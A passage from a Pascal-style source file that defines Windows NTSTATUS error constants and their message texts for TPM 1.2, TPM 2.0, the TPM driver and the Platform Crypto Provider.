STATUS_TPM_NOT_FULLWRITE         = NTSTATUS($C0290046);

//
// MessageId: STATUS_TPM_CONTEXT_GAP
//
// MessageText:
//
// TPM 1.2: The gap between saved context counts is too large.
//
STATUS_TPM_CONTEXT_GAP           = NTSTATUS($C0290047);

//
// MessageId: STATUS_TPM_MAXNVWRITES
//
// MessageText:
//
// TPM 1.2: The maximum number of NV writes without an owner has been exceeded.
//
STATUS_TPM_MAXNVWRITES           = NTSTATUS($C0290048);

//
// MessageId: STATUS_TPM_NOOPERATOR
//
// MessageText:
//
// TPM 1.2: No operator AuthData value is set.
//
STATUS_TPM_NOOPERATOR            = NTSTATUS($C0290049);

//
// MessageId: STATUS_TPM_RESOURCEMISSING
//
// MessageText:
//
// TPM 1.2: The resource pointed to by context is not loaded.
//
STATUS_TPM_RESOURCEMISSING       = NTSTATUS($C029004A);

//
// MessageId: STATUS_TPM_DELEGATE_LOCK
//
// MessageText:
//
// TPM 1.2: The delegate administration is locked.
//
STATUS_TPM_DELEGATE_LOCK         = NTSTATUS($C029004B);

//
// MessageId: STATUS_TPM_DELEGATE_FAMILY
//
// MessageText:
//
// TPM 1.2: Attempt to manage a family other then the delegated family.
//
STATUS_TPM_DELEGATE_FAMILY       = NTSTATUS($C029004C);

//
// MessageId: STATUS_TPM_DELEGATE_ADMIN
//
// MessageText:
//
// TPM 1.2: Delegation table management not enabled.
//
STATUS_TPM_DELEGATE_ADMIN        = NTSTATUS($C029004D);

//
// MessageId: STATUS_TPM_TRANSPORT_NOTEXCLUSIVE
//
// MessageText:
//
// TPM 1.2: There was a command executed outside of an exclusive transport session.
//
STATUS_TPM_TRANSPORT_NOTEXCLUSIVE = NTSTATUS($C029004E);

//
// MessageId: STATUS_TPM_OWNER_CONTROL
//
// MessageText:
//
// TPM 1.2: Attempt to context save a owner evict controlled key.
//
STATUS_TPM_OWNER_CONTROL         = NTSTATUS($C029004F);

//
// MessageId: STATUS_TPM_DAA_RESOURCES
//
// MessageText:
//
// TPM 1.2: The DAA command has no resources available to execute the command.
//
STATUS_TPM_DAA_RESOURCES         = NTSTATUS($C0290050);

//
// MessageId: STATUS_TPM_DAA_INPUT_DATA0
//
// MessageText:
//
// TPM 1.2: The consistency check on DAA parameter inputData0 has failed.
//
STATUS_TPM_DAA_INPUT_DATA0       = NTSTATUS($C0290051);

//
// MessageId: STATUS_TPM_DAA_INPUT_DATA1
//
// MessageText:
//
// TPM 1.2: The consistency check on DAA parameter inputData1 has failed.
//
STATUS_TPM_DAA_INPUT_DATA1       = NTSTATUS($C0290052);

//
// MessageId: STATUS_TPM_DAA_ISSUER_SETTINGS
//
// MessageText:
//
// TPM 1.2: The consistency check on DAA_issuerSettings has failed.
//
STATUS_TPM_DAA_ISSUER_SETTINGS   = NTSTATUS($C0290053);

//
// MessageId: STATUS_TPM_DAA_TPM_SETTINGS
//
// MessageText:
//
// TPM 1.2: The consistency check on DAA_tpmSpecific has failed.
//
STATUS_TPM_DAA_TPM_SETTINGS      = NTSTATUS($C0290054);

//
// MessageId: STATUS_TPM_DAA_STAGE
//
// MessageText:
//
// TPM 1.2: The atomic process indicated by the submitted DAA command is not the expected process.
//
STATUS_TPM_DAA_STAGE             = NTSTATUS($C0290055);

//
// MessageId: STATUS_TPM_DAA_ISSUER_VALIDITY
//
// MessageText:
//
// TPM 1.2: The issuer's validity check has detected an inconsistency.
//
STATUS_TPM_DAA_ISSUER_VALIDITY   = NTSTATUS($C0290056);

//
// MessageId: STATUS_TPM_DAA_WRONG_W
//
// MessageText:
//
// TPM 1.2: The consistency check on w has failed.
//
STATUS_TPM_DAA_WRONG_W           = NTSTATUS($C0290057);

//
// MessageId: STATUS_TPM_BAD_HANDLE
//
// MessageText:
//
// TPM 1.2: The handle is incorrect.
//
STATUS_TPM_BAD_HANDLE            = NTSTATUS($C0290058);

//
// MessageId: STATUS_TPM_BAD_DELEGATE
//
// MessageText:
//
// TPM 1.2: Delegation is not correct.
//
STATUS_TPM_BAD_DELEGATE          = NTSTATUS($C0290059);

//
// MessageId: STATUS_TPM_BADCONTEXT
//
// MessageText:
//
// TPM 1.2: The context blob is invalid.
//
STATUS_TPM_BADCONTEXT            = NTSTATUS($C029005A);

//
// MessageId: STATUS_TPM_TOOMANYCONTEXTS
//
// MessageText:
//
// TPM 1.2: Too many contexts held by the TPM.
//
STATUS_TPM_TOOMANYCONTEXTS       = NTSTATUS($C029005B);

//
// MessageId: STATUS_TPM_MA_TICKET_SIGNATURE
//
// MessageText:
//
// TPM 1.2: Migration authority signature validation failure.
//
STATUS_TPM_MA_TICKET_SIGNATURE   = NTSTATUS($C029005C);

//
// MessageId: STATUS_TPM_MA_DESTINATION
//
// MessageText:
//
// TPM 1.2: Migration destination not authenticated.
//
STATUS_TPM_MA_DESTINATION        = NTSTATUS($C029005D);

//
// MessageId: STATUS_TPM_MA_SOURCE
//
// MessageText:
//
// TPM 1.2: Migration source incorrect.
//
STATUS_TPM_MA_SOURCE             = NTSTATUS($C029005E);

//
// MessageId: STATUS_TPM_MA_AUTHORITY
//
// MessageText:
//
// TPM 1.2: Incorrect migration authority.
//
STATUS_TPM_MA_AUTHORITY          = NTSTATUS($C029005F);

//
// MessageId: STATUS_TPM_PERMANENTEK
//
// MessageText:
//
// TPM 1.2: Attempt to revoke the EK and the EK is not revocable.
//
STATUS_TPM_PERMANENTEK           = NTSTATUS($C0290061);

//
// MessageId: STATUS_TPM_BAD_SIGNATURE
//
// MessageText:
//
// TPM 1.2: Bad signature of CMK ticket.
//
STATUS_TPM_BAD_SIGNATURE         = NTSTATUS($C0290062);

//
// MessageId: STATUS_TPM_NOCONTEXTSPACE
//
// MessageText:
//
// TPM 1.2: There is no room in the context list for additional contexts.
//
STATUS_TPM_NOCONTEXTSPACE        = NTSTATUS($C0290063);

//
// MessageId: STATUS_TPM_20_E_ASYMMETRIC
//
// MessageText:
//
// TPM 2.0: Asymmetric algorithm not supported or not correct.
//
STATUS_TPM_20_E_ASYMMETRIC       = NTSTATUS($C0290081);

//
// MessageId: STATUS_TPM_20_E_ATTRIBUTES
//
// MessageText:
//
// TPM 2.0: Inconsistent attributes.
//
STATUS_TPM_20_E_ATTRIBUTES       = NTSTATUS($C0290082);

//
// MessageId: STATUS_TPM_20_E_HASH
//
// MessageText:
//
// TPM 2.0: Hash algorithm not supported or not appropriate.
//
STATUS_TPM_20_E_HASH             = NTSTATUS($C0290083);

//
// MessageId: STATUS_TPM_20_E_VALUE
//
// MessageText:
//
// TPM 2.0: Value is out of range or is not correct for the context.
//
STATUS_TPM_20_E_VALUE            = NTSTATUS($C0290084);

//
// MessageId: STATUS_TPM_20_E_HIERARCHY
//
// MessageText:
//
// TPM 2.0: Hierarchy is not enabled or is not correct for the use.
//
STATUS_TPM_20_E_HIERARCHY        = NTSTATUS($C0290085);

//
// MessageId: STATUS_TPM_20_E_KEY_SIZE
//
// MessageText:
//
// TPM 2.0: Key size is not supported.
//
STATUS_TPM_20_E_KEY_SIZE         = NTSTATUS($C0290087);

//
// MessageId: STATUS_TPM_20_E_MGF
//
// MessageText:
//
// TPM 2.0: Mask generation function not supported.
//
STATUS_TPM_20_E_MGF              = NTSTATUS($C0290088);

//
// MessageId: STATUS_TPM_20_E_MODE
//
// MessageText:
//
// TPM 2.0: Mode of operation not supported.
//
STATUS_TPM_20_E_MODE             = NTSTATUS($C0290089);

//
// MessageId: STATUS_TPM_20_E_TYPE
//
// MessageText:
//
// TPM 2.0: The type of the value is not appropriate for the use.
//
STATUS_TPM_20_E_TYPE             = NTSTATUS($C029008A);

//
// MessageId: STATUS_TPM_20_E_HANDLE
//
// MessageText:
//
// TPM 2.0: The Handle is not correct for the use.
//
STATUS_TPM_20_E_HANDLE           = NTSTATUS($C029008B);

//
// MessageId: STATUS_TPM_20_E_KDF
//
// MessageText:
//
// TPM 2.0: Unsupported key derivation function or function not appropriate for use.
//
STATUS_TPM_20_E_KDF              = NTSTATUS($C029008C);

//
// MessageId: STATUS_TPM_20_E_RANGE
//
// MessageText:
//
// TPM 2.0: Value was out of allowed range.
//
STATUS_TPM_20_E_RANGE            = NTSTATUS($C029008D);

//
// MessageId: STATUS_TPM_20_E_AUTH_FAIL
//
// MessageText:
//
// TPM 2.0: The authorization HMAC check failed and DA counter incremented.
//
STATUS_TPM_20_E_AUTH_FAIL        = NTSTATUS($C029008E);

//
// MessageId: STATUS_TPM_20_E_NONCE
//
// MessageText:
//
// TPM 2.0: Invalid nonce size.
//
STATUS_TPM_20_E_NONCE            = NTSTATUS($C029008F);

//
// MessageId: STATUS_TPM_20_E_PP
//
// MessageText:
//
// TPM 2.0: Authorization requires assertion of PP.
//
STATUS_TPM_20_E_PP               = NTSTATUS($C0290090);

//
// MessageId: STATUS_TPM_20_E_SCHEME
//
// MessageText:
//
// TPM 2.0: Unsupported or incompatible scheme.
//
STATUS_TPM_20_E_SCHEME           = NTSTATUS($C0290092);

//
// MessageId: STATUS_TPM_20_E_SIZE
//
// MessageText:
//
// TPM 2.0: Structure is wrong size.
//
STATUS_TPM_20_E_SIZE             = NTSTATUS($C0290095);

//
// MessageId: STATUS_TPM_20_E_SYMMETRIC
//
// MessageText:
//
// TPM 2.0: Unsupported symmetric algorithm or key size, or not appropriate for instance.
//
STATUS_TPM_20_E_SYMMETRIC        = NTSTATUS($C0290096);

//
// MessageId: STATUS_TPM_20_E_TAG
//
// MessageText:
//
// TPM 2.0: Incorrect structure tag.
//
STATUS_TPM_20_E_TAG              = NTSTATUS($C0290097);

//
// MessageId: STATUS_TPM_20_E_SELECTOR
//
// MessageText:
//
// TPM 2.0: Union selector is incorrect.
//
STATUS_TPM_20_E_SELECTOR         = NTSTATUS($C0290098);

//
// MessageId: STATUS_TPM_20_E_INSUFFICIENT
//
// MessageText:
//
// TPM 2.0: The TPM was unable to unmarshal a value because there were not enough octets in the input buffer.
//
STATUS_TPM_20_E_INSUFFICIENT     = NTSTATUS($C029009A);

//
// MessageId: STATUS_TPM_20_E_SIGNATURE
//
// MessageText:
//
// TPM 2.0: The signature is not valid.
//
STATUS_TPM_20_E_SIGNATURE        = NTSTATUS($C029009B);

//
// MessageId: STATUS_TPM_20_E_KEY
//
// MessageText:
//
// TPM 2.0: Key fields are not compatible with the selected use.
//
STATUS_TPM_20_E_KEY              = NTSTATUS($C029009C);

//
// MessageId: STATUS_TPM_20_E_POLICY_FAIL
//
// MessageText:
//
// TPM 2.0: A policy check failed.
//
STATUS_TPM_20_E_POLICY_FAIL      = NTSTATUS($C029009D);

//
// MessageId: STATUS_TPM_20_E_INTEGRITY
//
// MessageText:
//
// TPM 2.0: Integrity check failed.
//
STATUS_TPM_20_E_INTEGRITY        = NTSTATUS($C029009F);

//
// MessageId: STATUS_TPM_20_E_TICKET
//
// MessageText:
//
// TPM 2.0: Invalid ticket.
//
STATUS_TPM_20_E_TICKET           = NTSTATUS($C02900A0);

//
// MessageId: STATUS_TPM_20_E_RESERVED_BITS
//
// MessageText:
//
// TPM 2.0: Reserved bits not set to zero as required.
//
STATUS_TPM_20_E_RESERVED_BITS    = NTSTATUS($C02900A1);

//
// MessageId: STATUS_TPM_20_E_BAD_AUTH
//
// MessageText:
//
// TPM 2.0: Authorization failure without DA implications.
//
STATUS_TPM_20_E_BAD_AUTH         = NTSTATUS($C02900A2);

//
// MessageId: STATUS_TPM_20_E_EXPIRED
//
// MessageText:
//
// TPM 2.0: The policy has expired.
//
STATUS_TPM_20_E_EXPIRED          = NTSTATUS($C02900A3);

//
// MessageId: STATUS_TPM_20_E_POLICY_CC
//
// MessageText:
//
// TPM 2.0: The command code in the policy is not the command code of the command or the command code in a policy command references a command that is not implemented.
//
STATUS_TPM_20_E_POLICY_CC        = NTSTATUS($C02900A4);

//
// MessageId: STATUS_TPM_20_E_BINDING
//
// MessageText:
//
// TPM 2.0: Public and sensitive portions of an object are not cryptographically bound.
//
STATUS_TPM_20_E_BINDING          = NTSTATUS($C02900A5);

//
// MessageId: STATUS_TPM_20_E_CURVE
//
// MessageText:
//
// TPM 2.0: Curve not supported.
//
STATUS_TPM_20_E_CURVE            = NTSTATUS($C02900A6);

//
// MessageId: STATUS_TPM_20_E_ECC_POINT
//
// MessageText:
//
// TPM 2.0: Point is not on the required curve.
//
STATUS_TPM_20_E_ECC_POINT        = NTSTATUS($C02900A7);

//
// MessageId: STATUS_TPM_20_E_INITIALIZE
//
// MessageText:
//
// TPM 2.0: TPM not initialized.
//
STATUS_TPM_20_E_INITIALIZE       = NTSTATUS($C0290100);

//
// MessageId: STATUS_TPM_20_E_FAILURE
//
// MessageText:
//
// TPM 2.0: Commands not being accepted because of a TPM failure.
//
STATUS_TPM_20_E_FAILURE          = NTSTATUS($C0290101);

//
// MessageId: STATUS_TPM_20_E_SEQUENCE
//
// MessageText:
//
// TPM 2.0: Improper use of a sequence handle.
//
STATUS_TPM_20_E_SEQUENCE         = NTSTATUS($C0290103);

//
// MessageId: STATUS_TPM_20_E_PRIVATE
//
// MessageText:
//
// TPM 2.0: TPM_RC_PRIVATE error.
//
STATUS_TPM_20_E_PRIVATE          = NTSTATUS($C029010B);

//
// MessageId: STATUS_TPM_20_E_HMAC
//
// MessageText:
//
// TPM 2.0: TPM_RC_HMAC.
//
STATUS_TPM_20_E_HMAC             = NTSTATUS($C0290119);

//
// MessageId: STATUS_TPM_20_E_DISABLED
//
// MessageText:
//
// TPM 2.0: TPM_RC_DISABLED.
//
STATUS_TPM_20_E_DISABLED         = NTSTATUS($C0290120);

//
// MessageId: STATUS_TPM_20_E_EXCLUSIVE
//
// MessageText:
//
// TPM 2.0: Command failed because audit sequence required exclusivity.
//
STATUS_TPM_20_E_EXCLUSIVE        = NTSTATUS($C0290121);

//
// MessageId: STATUS_TPM_20_E_ECC_CURVE
//
// MessageText:
//
// TPM 2.0: Unsupported ECC curve.
//
STATUS_TPM_20_E_ECC_CURVE        = NTSTATUS($C0290123);

//
// MessageId: STATUS_TPM_20_E_AUTH_TYPE
//
// MessageText:
//
// TPM 2.0: Authorization handle is not correct for command.
//
STATUS_TPM_20_E_AUTH_TYPE        = NTSTATUS($C0290124);

//
// MessageId: STATUS_TPM_20_E_AUTH_MISSING
//
// MessageText:
//
// TPM 2.0: Command requires an authorization session for handle and is not present.
//
STATUS_TPM_20_E_AUTH_MISSING     = NTSTATUS($C0290125);

//
// MessageId: STATUS_TPM_20_E_POLICY
//
// MessageText:
//
// TPM 2.0: Policy failure in Math Operation or an invalid authPolicy value.
//
STATUS_TPM_20_E_POLICY           = NTSTATUS($C0290126);

//
// MessageId: STATUS_TPM_20_E_PCR
//
// MessageText:
//
// TPM 2.0: PCR check fail.
//
STATUS_TPM_20_E_PCR              = NTSTATUS($C0290127);

//
// MessageId: STATUS_TPM_20_E_PCR_CHANGED
//
// MessageText:
//
// TPM 2.0: PCR have changed since checked.
//
STATUS_TPM_20_E_PCR_CHANGED      = NTSTATUS($C0290128);

//
// MessageId: STATUS_TPM_20_E_UPGRADE
//
// MessageText:
//
// TPM 2.0: The TPM is not in the right mode for upgrade.
//
STATUS_TPM_20_E_UPGRADE          = NTSTATUS($C029012D);

//
// MessageId: STATUS_TPM_20_E_TOO_MANY_CONTEXTS
//
// MessageText:
//
// TPM 2.0: Context ID counter is at maximum.
//
STATUS_TPM_20_E_TOO_MANY_CONTEXTS = NTSTATUS($C029012E);

//
// MessageId: STATUS_TPM_20_E_AUTH_UNAVAILABLE
//
// MessageText:
//
// TPM 2.0: authValue or authPolicy is not available for selected entity.
//
STATUS_TPM_20_E_AUTH_UNAVAILABLE = NTSTATUS($C029012F);

//
// MessageId: STATUS_TPM_20_E_REBOOT
//
// MessageText:
//
// TPM 2.0: A _TPM_Init and Startup(CLEAR) is required before the TPM can resume operation.
//
STATUS_TPM_20_E_REBOOT           = NTSTATUS($C0290130);

//
// MessageId: STATUS_TPM_20_E_UNBALANCED
//
// MessageText:
//
// TPM 2.0: The protection algorithms (hash and symmetric) are not reasonably balanced. The digest size of the hash must be larger than the key size of the symmetric algorithm.
//
STATUS_TPM_20_E_UNBALANCED       = NTSTATUS($C0290131);

//
// MessageId: STATUS_TPM_20_E_COMMAND_SIZE
//
// MessageText:
//
// TPM 2.0: The TPM command's commandSize value is inconsistent with contents of the command buffer); either the size is not the same as the bytes loaded by the hardware interface layer or the value is not large enough to hold a command header.
//
STATUS_TPM_20_E_COMMAND_SIZE     = NTSTATUS($C0290142);

//
// MessageId: STATUS_TPM_20_E_COMMAND_CODE
//
// MessageText:
//
// TPM 2.0: Command code not supported.
//
STATUS_TPM_20_E_COMMAND_CODE     = NTSTATUS($C0290143);

//
// MessageId: STATUS_TPM_20_E_AUTHSIZE
//
// MessageText:
//
// TPM 2.0: The value of authorizationSize is out of range or the number of octets in the authorization Area is greater than required.
//
STATUS_TPM_20_E_AUTHSIZE         = NTSTATUS($C0290144);

//
// MessageId: STATUS_TPM_20_E_AUTH_CONTEXT
//
// MessageText:
//
// TPM 2.0: Use of an authorization session with a context command or another command that cannot have an authorization session.
//
STATUS_TPM_20_E_AUTH_CONTEXT     = NTSTATUS($C0290145);

//
// MessageId: STATUS_TPM_20_E_NV_RANGE
//
// MessageText:
//
// TPM 2.0: NV offset+size is out of range.
//
STATUS_TPM_20_E_NV_RANGE         = NTSTATUS($C0290146);

//
// MessageId: STATUS_TPM_20_E_NV_SIZE
//
// MessageText:
//
// TPM 2.0: Requested allocation size is larger than allowed.
//
STATUS_TPM_20_E_NV_SIZE          = NTSTATUS($C0290147);

//
// MessageId: STATUS_TPM_20_E_NV_LOCKED
//
// MessageText:
//
// TPM 2.0: NV access locked.
//
STATUS_TPM_20_E_NV_LOCKED        = NTSTATUS($C0290148);

//
// MessageId: STATUS_TPM_20_E_NV_AUTHORIZATION
//
// MessageText:
//
// TPM 2.0: NV access authorization fails in command actions
//
STATUS_TPM_20_E_NV_AUTHORIZATION = NTSTATUS($C0290149);

//
// MessageId: STATUS_TPM_20_E_NV_UNINITIALIZED
//
// MessageText:
//
// TPM 2.0: An NV index is used before being initialized or the state saved by TPM2_Shutdown(STATE) could not be restored.
//
STATUS_TPM_20_E_NV_UNINITIALIZED = NTSTATUS($C029014A);

//
// MessageId: STATUS_TPM_20_E_NV_SPACE
//
// MessageText:
//
// TPM 2.0: Insufficient space for NV allocation.
//
STATUS_TPM_20_E_NV_SPACE         = NTSTATUS($C029014B);

//
// MessageId: STATUS_TPM_20_E_NV_DEFINED
//
// MessageText:
//
// TPM 2.0: NV index or persistent object already defined.
//
STATUS_TPM_20_E_NV_DEFINED       = NTSTATUS($C029014C);

//
// MessageId: STATUS_TPM_20_E_BAD_CONTEXT
//
// MessageText:
//
// TPM 2.0: Context in TPM2_ContextLoad() is not valid.
//
STATUS_TPM_20_E_BAD_CONTEXT      = NTSTATUS($C0290150);

//
// MessageId: STATUS_TPM_20_E_CPHASH
//
// MessageText:
//
// TPM 2.0: chHash value already set or not correct for use.
//
STATUS_TPM_20_E_CPHASH           = NTSTATUS($C0290151);

//
// MessageId: STATUS_TPM_20_E_PARENT
//
// MessageText:
//
// TPM 2.0: Handle for parent is not a valid parent.
//
STATUS_TPM_20_E_PARENT           = NTSTATUS($C0290152);

//
// MessageId: STATUS_TPM_20_E_NEEDS_TEST
//
// MessageText:
//
// TPM 2.0: Some function needs testing.
//
STATUS_TPM_20_E_NEEDS_TEST       = NTSTATUS($C0290153);

//
// MessageId: STATUS_TPM_20_E_NO_RESULT
//
// MessageText:
//
// TPM 2.0: returned when an internal function cannot process a request due to an unspecified problem. This code is usually related to invalid parameters that are not properly filtered by the input unmarshaling code.
//
STATUS_TPM_20_E_NO_RESULT        = NTSTATUS($C0290154);

//
// MessageId: STATUS_TPM_20_E_SENSITIVE
//
// MessageText:
//
// TPM 2.0: The sensitive area did not unmarshal correctly after decryption - this code is used in lieu of the other unmarshaling errors so that an attacker cannot determine where the unmarshaling error occurred.
//
STATUS_TPM_20_E_SENSITIVE        = NTSTATUS($C0290155);

//
// TPM vendor specific hardware errors {0x0400..0x04ff}
//
//
// MessageId: STATUS_TPM_COMMAND_BLOCKED
//
// MessageText:
//
// The command was blocked.
//
STATUS_TPM_COMMAND_BLOCKED       = NTSTATUS($C0290400);

//
// MessageId: STATUS_TPM_INVALID_HANDLE
//
// MessageText:
//
// The specified handle was not found.
//
STATUS_TPM_INVALID_HANDLE        = NTSTATUS($C0290401);

//
// MessageId: STATUS_TPM_DUPLICATE_VHANDLE
//
// MessageText:
//
// The TPM returned a duplicate handle and the command needs to be resubmitted.
//
STATUS_TPM_DUPLICATE_VHANDLE     = NTSTATUS($C0290402);

//
// MessageId: STATUS_TPM_EMBEDDED_COMMAND_BLOCKED
//
// MessageText:
//
// The command within the transport was blocked.
//
STATUS_TPM_EMBEDDED_COMMAND_BLOCKED = NTSTATUS($C0290403);

//
// MessageId: STATUS_TPM_EMBEDDED_COMMAND_UNSUPPORTED
//
// MessageText:
//
// The command within the transport is not supported.
//
STATUS_TPM_EMBEDDED_COMMAND_UNSUPPORTED = NTSTATUS($C0290404);

//
// TPM non-fatal hardware errors {0x0800..0x08ff}
//
//
// MessageId: STATUS_TPM_RETRY
//
// MessageText:
//
// The TPM is too busy to respond to the command immediately, but the command could be resubmitted at a later time.
//
STATUS_TPM_RETRY                 = NTSTATUS($C0290800);

//
// MessageId: STATUS_TPM_NEEDS_SELFTEST
//
// MessageText:
//
// SelfTestFull has not been run.
//
STATUS_TPM_NEEDS_SELFTEST        = NTSTATUS($C0290801);

//
// MessageId: STATUS_TPM_DOING_SELFTEST
//
// MessageText:
//
// The TPM is currently executing a full selftest.
//
STATUS_TPM_DOING_SELFTEST        = NTSTATUS($C0290802);

//
// MessageId: STATUS_TPM_DEFEND_LOCK_RUNNING
//
// MessageText:
//
// The TPM is defending against dictionary attacks and is in a time-out period.
//
STATUS_TPM_DEFEND_LOCK_RUNNING   = NTSTATUS($C0290803);


//
// TPM software Error codes (tpm.sys)
//

//
// MessageId: STATUS_TPM_COMMAND_CANCELED
//
// MessageText:
//
// The command was cancelled.
//
STATUS_TPM_COMMAND_CANCELED      = NTSTATUS($C0291001);

//
// MessageId: STATUS_TPM_TOO_MANY_CONTEXTS
//
// MessageText:
//
// A new TPM context could not be created because there are too many open contexts.
//
STATUS_TPM_TOO_MANY_CONTEXTS     = NTSTATUS($C0291002);

//
// MessageId: STATUS_TPM_NOT_FOUND
//
// MessageText:
//
// TPM driver is not compatible with the version of TPM found on the system.
//
STATUS_TPM_NOT_FOUND             = NTSTATUS($C0291003);

//
// MessageId: STATUS_TPM_ACCESS_DENIED
//
// MessageText:
//
// The caller does not have the appropriate rights to perform the requested operation.
//
STATUS_TPM_ACCESS_DENIED         = NTSTATUS($C0291004);

//
// MessageId: STATUS_TPM_INSUFFICIENT_BUFFER
//
// MessageText:
//
// The caller does not have the appropriate rights to perform the requested operation.
//
STATUS_TPM_INSUFFICIENT_BUFFER   = NTSTATUS($C0291005);

//
// MessageId: STATUS_TPM_PPI_FUNCTION_UNSUPPORTED
//
// MessageText:
//
// The Physical Presence Interface of this firmware does not support the requested method.
//
STATUS_TPM_PPI_FUNCTION_UNSUPPORTED = NTSTATUS($C0291006);


//
// Platform Crypto Provider Error Codes (PCPKSP.dll and future platform crypto providers)
//

//
// MessageId: STATUS_PCP_ERROR_MASK
//
// MessageText:
//
// This is an error mask to convert Platform Crypto Provider errors to win errors.
//
STATUS_PCP_ERROR_MASK            = NTSTATUS($C0292000);

//
// MessageId: STATUS_PCP_DEVICE_NOT_READY
//
// MessageText:
//
// The Platform Crypto Device is currently not ready. It needs to be fully provisioned to be operational.
//
STATUS_PCP_DEVICE_NOT_READY      = NTSTATUS($C0292001);

//
// MessageId: STATUS_PCP_INVALID_HANDLE
//
// MessageText:
//
// The handle provided to the Platform Crypto Provider is invalid.
//
STATUS_PCP_INVALID_HANDLE        = NTSTATUS($C0292002);

//
// MessageId: STATUS_PCP_INVALID_PARAMETER
//
// MessageText:
//
// A parameter provided to the Platform Crypto Provider is invalid.
//
STATUS_PCP_INVALID_PARAMETER     = NTSTATUS($C0292003);

//
// MessageId: STATUS_PCP_FLAG_NOT_SUPPORTED
//
// MessageText:
//
// A provided flag to the Platform Crypto Provider is not supported.
//
STATUS_PCP_FLAG_NOT_SUPPORTED    = NTSTATUS($C0292004);

//
// MessageId: STATUS_PCP_NOT_SUPPORTED
//
// MessageText:
//
// The requested operation is not supported by this Platform Crypto Provider.
//
STATUS_PCP_NOT_SUPPORTED         = NTSTATUS($C0292005);

//
// MessageId: STATUS_PCP_BUFFER_TOO_SMALL
//
// MessageText:
//
// The buffer is too small to contain all data. No information has been written to the buffer.
//
STATUS_PCP_BUFFER_TOO_SMALL      = NTSTATUS($C0292006);

//
// MessageId: STATUS_PCP_INTERNAL_ERROR
//
// MessageText:
//
// An unexpected internal error has occurred in the Platform Crypto Provider.
//
STATUS_PCP_INTERNAL_ERROR        = NTSTATUS($C0292007);

//
// MessageId: STATUS_PCP_AUTHENTICATION_FAILED
//
// MessageText:
//
// The authorization to use a provider object has failed.
//
STATUS_PCP_AUTHENTICATION_FAILED = NTSTATUS($C0292008);

//
// MessageId: STATUS_PCP_AUTHENTICATION_IGNORED
//
// MessageText:
//
// The Platform Crypto Device has ignored the authorization for the provider object, to mitigate against a dictionary attack.
//
STATUS_PCP_AUTHENTICATION_IGNORED = NTSTATUS($C0292009);

//
// MessageId: STATUS_PCP_POLICY_NOT_FOUND
//
// MessageText:
//
// The referenced policy was not found.
//
STATUS_PCP_POLICY_NOT_FOUND      = NTSTATUS($C029200A);

//
// MessageId: STATUS_PCP_PROFILE_NOT_FOUND
//
// MessageText:
//
// The referenced profile was not found.
//
STATUS_PCP_PROFILE_NOT_FOUND     = NTSTATUS($C029200B);

//
// MessageId: STATUS_PCP_VALIDATION_FAILED
//
// MessageText:
//
// The validation was not successful.
//
STATUS_PCP_VALIDATION_FAILED     = NTSTATUS($C029200C);

//
// MessageId: STATUS_PCP_DEVICE_NOT_FOUND
//
// MessageText:
//
// A Platform Crypto Device was not found.  Operations that require a Platform Crypto Device will not be submitted.
//
STATUS_PCP_DEVICE_NOT_FOUND      = NTSTATUS($C029200D);

//
// MessageId: STATUS_PCP_WRONG_PARENT
//
// MessageText:
//
// An attempt was made to import or load a key under an incorrect storage parent.
//
STATUS_PCP_WRONG_PARENT          = NTSTATUS($C029200E);

//
// MessageId: STATUS_PCP_KEY_NOT_LOADED
//
// MessageText:
//
// The TPM key is not loaded.
//
STATUS_PCP_KEY_NOT_LOADED        = NTSTATUS($C029200F);

//
// MessageId: STATUS_PCP_NO_KEY_CERTIFICATION
//
// MessageText:
//
// The TPM key certification has not been generated.
//
STATUS_PCP_NO_KEY_CERTIFICATION  = NTSTATUS($C0292010);

//
// MessageId: STATUS_PCP_KEY_NOT_FINALIZED
//
// MessageText:
//
// The TPM key is not yet finalized.
//
STATUS_PCP_KEY_NOT_FINALIZED     = NTSTATUS($C0292011);

//
// MessageId: STATUS_PCP_ATTESTATION_CHALLENGE_NOT_SET
//
// MessageText:
//
// The TPM attestation challenge is not set.
//
STATUS_PCP_ATTESTATION_CHALLENGE_NOT_SET = NTSTATUS($C0292012);

//
// MessageId: STATUS_PCP_NOT_PCR_BOUND
//
// MessageText:
//
// The TPM key is not bound to PCR info.
//
STATUS_PCP_NOT_PCR_BOUND         = NTSTATUS($C0292013);

//
// MessageId: STATUS_PCP_KEY_ALREADY_FINALIZED
//
// MessageText:
//
// The TPM key is already finalized.
//
STATUS_PCP_KEY_ALREADY_FINALIZED = NTSTATUS($C0292014);

//
// MessageId: STATUS_PCP_KEY_USAGE_POLICY_NOT_SUPPORTED
//
// MessageText:
//
// The TPM key usage policy is not supported.
//
STATUS_PCP_KEY_USAGE_POLICY_NOT_SUPPORTED = NTSTATUS($C0292015);

//
// MessageId: STATUS_PCP_KEY_USAGE_POLICY_INVALID
//
// MessageText:
//
// The TPM key usage policy is invalid.
//
STATUS_PCP_KEY_USAGE_POLICY_INVALID = NTSTATUS($C0292016);

//
// MessageId: STATUS_PCP_SOFT_KEY_ERROR
//
// MessageText:
//
// There was a problem with the software key being imported into the TPM.
//
STATUS_PCP_SOFT_KEY_ERROR        = NTSTATUS($C0292017);

//
// MessageId: STATUS_PCP_KEY_NOT_AUTHENTICATED
//
// MessageText:
//
// The TPM key is not authenticated.
//
STATUS_PCP_KEY_NOT_AUTHENTICATED = NTSTATUS($C0292018);

//
// MessageId: STATUS_PCP_KEY_NOT_AIK
//
// MessageText:
//
// The TPM key is not an AIK.
//
STATUS_PCP_KEY_NOT_AIK           = NTSTATUS($C0292019);

//
// MessageId: STATUS_PCP_KEY_NOT_SIGNING_KEY
//
// MessageText:
//
// The TPM key is not a signing key.
//
STATUS_PCP_KEY_NOT_SIGNING_KEY   = NTSTATUS($C029201A);

//
// MessageId: STATUS_PCP_LOCKED_OUT
//
// MessageText:
//
// The TPM is locked out.
//
STATUS_PCP_LOCKED_OUT            = NTSTATUS($C029201B);

//
// MessageId: STATUS_PCP_CLAIM_TYPE_NOT_SUPPORTED
//
// MessageText:
//
// The claim type requested is not supported.
//
STATUS_PCP_CLAIM_TYPE_NOT_SUPPORTED = NTSTATUS($C029201C);

//
// MessageId: STATUS_PCP_TPM_VERSION_NOT_SUPPORTED
//
// MessageText:
//
// The current TPM version is not supported.
//
STATUS_PCP_TPM_VERSION_NOT_SUPPORTED = NTSTATUS($C029201D);

//
// MessageId: STATUS_PCP_BUFFER_LENGTH_MISMATCH
//
// MessageText:
//
// The buffer lengths do not match.
//
STATUS_PCP_BUFFER_LENGTH_MISMATCH = NTSTATUS($C029201E);

//
// MessageId: STATUS_PCP_IFX_RSA_KEY_CREATION_BLOCKED
//
// MessageText:
//
